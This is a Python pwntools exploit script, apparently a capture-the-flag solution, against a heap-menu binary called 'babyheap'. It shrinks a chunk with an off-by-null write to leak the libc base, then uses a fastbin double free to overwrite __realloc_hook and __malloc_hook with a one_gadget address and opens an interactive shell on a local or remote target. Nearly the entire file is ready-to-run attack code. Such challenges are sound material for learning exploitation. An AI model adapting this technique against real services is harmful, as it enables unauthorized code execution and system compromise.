from pwn import *

g_fname = args.FNAME if (args.FNAME) else "./babyheap"
g_elf = ELF(g_fname)
context.binary = g_elf
g_libcname = args.LIB if (args.LIB) else "/lib/x86_64-linux-gnu/libc.so.6"

if (args.LOCAL):
    g_io = process(g_fname)
else:
    rhost, rport = args.REMOTE.split(":")
    g_io = remote(rhost, int(rport))

g_libc = ELF(g_libcname)

def getpid():
    if (args.LOCAL):
        log.info("PID: %d", g_io.proc.pid)
        pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
    sla(">> \n", str(idx))

def create(content, size):
    opt(1)
    sla("input your name size\n", str(size))
    if (len(content) <= size):
        sla("input your name\n", content)
    else:
        sa("input your name\n", content)

def delete(idx):
    opt(4)
    sla("input index\n", str(idx))

def show(idx):
    opt(3)
    sla("input index\n", str(idx))

def pwn():
    create("A", 0x88)   # 0
    create("B", 0x68)   # 1
    create("C", 0xf8)   # 2
    create("D: gurad chk 1", 0x20) # 3
    create("E", 0x68)   # 4
    create("F: guard chk 2", 0x20) # 5

    delete(0)
    delete(1)
    create(flat(['b'*0x60, 0x100, '\0']), 0x68) # take slot 0

    # extend chunk [A|B|C]
    delete(2)

    create("A: realloc chk A, reminder [B|C]", 0x88) # take slot 1
    show(0)
    data = rl()[:-1]
    log.info("recv data: %s", data)
    libc_base = u64(data.ljust(8, b'\0')) - 0x3c4b78
    log.success("libc@%#x", libc_base)
    g_libc.address = libc_base

    # getpid()

    create("B: double malloc to chk B.", 0x68) # take slot 2
    
    # fastbin double free attack
    delete(2)
    delete(4)
    delete(0)

    addr_realloc_hook = g_libc.sym["__realloc_hook"]
    addr_realloc = g_libc.sym["realloc"]
    addr_fake_fast = addr_realloc_hook - 0x1b
    addr_ogg = libc_base + [0x4527a, 0x4526a][0 if args.LOCAL else 1]
    log.success("__realloc_hook@%#x\n\t__GI___libc_realloc@%#x\n\tfake_fast@%#x\n\tone_gadget@%#x"
        , addr_realloc_hook
        , addr_realloc
        , addr_fake_fast
        , addr_ogg
    )
    
    pad_len = addr_realloc_hook - addr_fake_fast - 0x10
    create(p64(addr_fake_fast), 0x68) # take slot 0
    create("E: re-malloc.", 0x68)   # take slot 2
    create("B: double malloc to chk B", 0x68) # take slot 4
    # overwrite __realloc_hook and __malloc_hook
    create(flat(['b'*pad_len, addr_ogg, addr_realloc + 0xc]), 0x68)

    getpid()

    opt(1)
    sla("input your name size\n", "100")

if ("__main__" == __name__):
    if (args.DEBUG):
        context.log_level = "debug"
    pwn()
    g_io.interactive()

